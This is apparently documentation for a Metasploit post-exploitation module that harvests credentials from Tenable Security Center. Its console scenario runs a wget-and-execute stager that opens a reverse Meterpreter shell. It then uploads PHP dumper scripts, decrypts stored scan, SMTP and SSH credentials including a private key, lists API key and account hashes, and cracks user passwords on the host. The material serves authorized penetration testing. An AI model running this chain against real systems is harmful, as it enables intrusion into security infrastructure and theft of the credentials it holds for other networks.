## Vulnerable Application

This module collects credentials and setup information
from Tenable Security Center. root or TNS user permissions
are required. We don't utilize SC's builtin backup
functionality as that requires SC to be shut down.
The module works in 2 phases:

Phase 1: gather all passwords which can be decrypted. These
are non-user ones such as credentials used for scans, creds
for the Nessus servers, SMTP, etc.

Phase 2: handle hashed passwords processing. SC uses SHA-512
and PBKDF2 according to the documentation, but the implementation
(salt+hash vs hash+salt) is unknown due to the source code being
protected by SourceGuardian. To get around this, we use a php
script on server to brute force the passwords. Note this will
use SC's resources. The crack attempt rate is ~6/sec on a test
instance, so you'll want a small password list.

Tested against SC 6.7.2 on RHEL9

## Verification Steps

1. Install and register Security Center
2. Start msfconsole
3. Get a shell with either root or tns permissions
4. Do: `use post/linux/gather/tenable_security_center`
5. Do: `set session #`
6. Optionally: `set wordlist /path`
7. Do: `run`
8. You should get information back about the install.

## Options

### WORDLIST

The path to an optional wordlist

## Scenarios

### SC 6.7.2 on RHEL9

```
resource (/root/.msf4/msfconsole.rc)> setg verbose true
verbose => true
resource (/root/.msf4/msfconsole.rc)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (/root/.msf4/msfconsole.rc)> use exploit/multi/script/web_delivery
[*] Using configured payload windows/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set target 7
target => 7
resource (/root/.msf4/msfconsole.rc)> set srvport 8082
srvport => 8082
resource (/root/.msf4/msfconsole.rc)> set uripath l
uripath => l
resource (/root/.msf4/msfconsole.rc)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set lport 4446
lport => 4446
resource (/root/.msf4/msfconsole.rc)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 1.1.1.1:4446 
[*] Using URL: http://1.1.1.1:8082/l
[*] Server started.
[*] Run the following command on the target machine:
wget -qO kWgJtZ4Q --no-check-certificate http://1.1.1.1:8082/l; chmod +x kWgJtZ4Q; ./kWgJtZ4Q& disown
msf exploit(multi/script/web_delivery) > 
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4446 -> 2.2.2.2:52304) at 2026-03-16 08:55:39 -0400

msf exploit(multi/script/web_delivery) > use post/linux/gather/tenable_security_center 
msf post(linux/gather/tenable_security_center) > set session 1
session => 1
msf post(linux/gather/tenable_security_center) > set wordlist /tmp/wordlist
wordlist => /tmp/wordlist
msf post(linux/gather/tenable_security_center) > run
[+] Security Center Version: 6.7.2
[*] Uploading database cred decryptor to /tmp/r6hGtD2Mah
[*] Running cred dumper: su - tns -s /bin/bash -c '/opt/sc/support/bin/php /tmp/r6hGtD2Mah -json'
[+] Decrypted Security Center credentials stored to: /root/.msf4/loot/20260316085739_default_2.2.2.2_tenable.security_848370.json
[+] Decrypted Credentials
=====================

 Source                          Table                       Username       Decrypted Password                                                                 Other Fields
 ------                          -----                       --------       ------------------                                                                 ------------
 /opt/sc/orgs/2/organization.db  SNMPCredential                             private
 application.db                  AppDatabaseCredential                      passymcpassword                                                                    SQL Server
 application.db                  AppMongoDBCredential        some_username  some_password
 application.db                  AppSSHCredential            example        -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA  SSH Key Passphrase: key_passphrase
                                                                            AAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACCY21CiSuyqAfGiGE1eIqIR7fclhhkO+cw979kOnRu06wA
                                                                            AAJhpJ3EJaCdxCQAAAAtzc2gtZWQyNTUxOQAAACCY24CiSuyqAfGiGE1eIpIR7fclhhkO+cw979kOnRu0
                                                                            6wAAAEBzvHy5P0637mCOebuHHgLiB/Ut8kcYgzLH0Syap8jjeJjbUKJK7KoB8aIYTV4iohHt9yWGGQ75z
                                                                            D3v2Q6dG7TrAAAAEmgwMGRpZUBoMDBkaWUta2FsaQECAw==-----END OPENSSH PRIVATE KEY-----
 application.db                  AppSSHCredential            sudo_username  sudo_password                                                                      Escalation method: sudo
 application.db                  AppSSHCredential            username       password_for_ssh
 application.db                  AppVMwarevCenterCredential  username       password222
 application.db                  AppWindowsCredential        asdf           asdf
 application.db                  Scanner                     nessus_server  nessus_password                                                                    Scanner Type: Nessus Professional
 application.db                  Configuration               smtp_username  smtp_password

[*] Uploading database cred dumper to /tmp/fl0QmCpEF
[*] Running cred dumper: su - tns -s /bin/bash -c '/opt/sc/support/bin/php /tmp/fl0QmCpEF -json'
[+] Decrypted Security Center credentials stored to: /root/.msf4/loot/20260316085741_default_2.2.2.2_tenable.security_043135.json
[+] API Keys
========

 ID  User ID  Name     Access Key                        Salt:Hash
 --  -------  ----     ----------                        ---------
 1   3        Default  83d9c8523f584e319859b729b703f9c1  lUAXtSEcCut4kpftsJBfy2b49rEJyUOZaP00Tx51uMeMJvYT6DCn15esxsHsM06KXB4I0+rJLCSMD37XrLQ6BQ==:62d672a940845ae06f844fdccee68111325b83c4df61c9a
                                                         af283539667ec85fe82810d7025781d268808e416135dae6db5657b033c894959fb3079da23389bb6

[+] Accounts Hashes
===============

 UserID  Org  Username                 Salt:Hash
 ------  ---  --------                 ---------
 1       0    admin                    UqH7knFagk9yS6XKeXZqVXxRSZU2BTMLEbb3iKl6qaxuLnYsgCLA4YvF2DSFbea01GldYI0bZMK3R+Zxd5t28A==:d9b9a8213a87189bef99ada7c07ccab7ec091832d621fb9a205993b32a1398a06
                                       989cf4ead2b5729d61ec6c412f0d5c55ee8f9a4b4fd13b066cf51c5c8393616
 2       1    Admin                    Cd6f7rouTCQVJKEaClhUe8iMjxq23UDmoapTqmcUU6C0i7LK0bv3cH7oNUz/yMCZUHPYiE3+zwzYibHsGnTywg==:e2fec651229ddaad008f13512b4edfe864b5836ba68168ebb3964786940fddceb
                                       52192d5176a2c568dde02984be7fb33dc997883e1958279c4f0d3b6642cd787
 3       0    aaaaa                    jS6T37YpKOnJLXuyigY8PerRH+98h08GmtqkwClQ3abRjwtuO9FFOcDNMZ4be2QXNTbKJFReVmCGO5Y1ppFSTg==:5318482893d13f65c9b7233c081637f2e270e92e224ea7cba2ed5e47ae8e9fw89
                                       58c8a8aa68a4a10f94db9ec77cfc3cb0f254367b7f6dc3526c70025ac4c8a0d
 4       2    test                     5/zuBrEPsFfwqVC45y702XiQ7vlnKCkIBxIq5gyCakWB7Is297wOBtiLmPkcNAdQRMO06xbKxNk4OJFWqPCriEQ==:e0351f1c9e177f3a14778b196e0443c8ab098f3ca643998f34600a6273a856eca
                                       8868dd12f763b619739b9fd30d4be016b4363ba54104a240b53b021660fcbc8
 5       2    my_password_is_password  EHT4bqXB4vrIDCFznxzGsI/6ZlCbl8B809mQenkV2D+IzDaGyXKbHwCGTDTelpZN6JXaGEMU9BkP2+T3wNTY5g==:843837907bg2ad388302a1372e0f247c9e3a3d9d89ec282588f4f79f60b07fae8
                                       a4e5d30894cd60fefane010b8f56b1de61c8854109ef16be0d3f391913c79da

[!] Estimated brute force time: 0.6 minutes (6 users x 36 words @ 6/sec)
[!] Waiting 5 seconds for user interuption if this is too long a time.
[*] Uploading wordlist to: /tmp/zGMwsI1Zix
[+] Cracked Credentials
===================

 ID  User                     Password  Admin
 --  ----                     --------  -----
 4   test                     test      false
 5   my_password_is_password  password  false

[*] Post module execution completed
```
